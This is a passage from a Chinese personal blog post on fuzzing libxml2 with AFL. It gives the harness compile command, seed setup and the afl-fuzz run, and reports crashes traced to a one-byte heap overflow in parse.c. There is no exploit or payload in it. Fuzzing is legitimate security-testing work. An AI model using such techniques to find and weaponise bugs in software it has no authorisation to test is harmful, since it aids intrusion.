<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AFL_USE_ASAN=1 afl-clang-fast ./harness.c -I libxml2/include libxml2/.libs/libxml2.a -lz -lm -o fuzzer</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-101002978.png" alt="undifined"></p>
<p>编写完 harness 后，就需要使用高质量的种子来启动 afl-fuzz，afl 的源码中提供了一个不错的 XML 字典，可以就使用它来作为初始种子。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir input</span><br><span class="line">echo &quot;&lt;hi&gt;&lt;/hi&gt;&quot; &gt; inout/hi.xml</span><br></pre></td></tr></table></figure>

<p>然后开始 fuzz，-x 是设定 fuzzer 的字典，@@ 类似于占位符，表示输入的位置，因为 harness 使用的是 argv 作为输入。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i in -o out -x ~/Code/AFL/dictionaries/xml.dict ./fuzzer @@</span><br></pre></td></tr></table></figure>

<p>然后让 AFL 在后台运行吧，等待结果，用虚拟机跑了一天，挖出来 16 个 crashes</p>
<p><img src="/images/image-2023-0413-101017775.png" alt="undifined"></p>
<h2 id="处理-crashes"><a href="#处理-crashes" class="headerlink" title="处理 crashes"></a>处理 crashes</h2><p>我们写出来的 harness 是通过命令参数读取文件，那么直接将 output&#x2F;crashes 中的文件给程序，就会报错。而且因为编译的时候使用了  ASAN 标志，会有详细的报错信息提醒。跑出来的 16 个 unique creashes 都是相同的报错：</p>
<p><img src="/images/image-2023-0413-101035360.png" alt="undifined"></p>
<p>通过上图中的函数堆栈回溯，我们可以定位错误的性质是一个字节的堆溢出，而且漏洞是发生在 libxml2&#x2F;parse.c 文件中。个人对堆了解得不是很深入，就在这个地方吧，埋一个坑，以后有空更新。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254167">[安全客] AFL-Training学习记录</a> </li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7400">[先知] 使用AFL挖掘libxml2</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">OneShell</p>
  <div class="site-description" itemprop="description">ToT</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">70</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">OneShell</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  


</body>
</html>
